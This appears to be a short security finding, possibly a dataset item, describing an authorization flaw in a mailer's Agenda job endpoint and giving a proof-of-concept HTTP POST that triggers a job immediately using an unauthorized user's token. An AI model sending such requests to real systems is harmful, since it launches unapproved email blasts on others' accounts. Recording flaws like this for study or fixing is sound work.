diagnosis: The endpoint triggers immediate execution of an Agenda job matching jobId without verifying that the authenticated user created the marketing email campaign or owns the target subscriber list, allowing premature launching of unapproved email blasts.
exploit_request:
POST /api/agenda/jobs/65b2100e4a9192001928371a/now HTTP/1.1
Host: mailer.marketinghub.io
Authorization: Bearer <unauthorized_user_jwt>
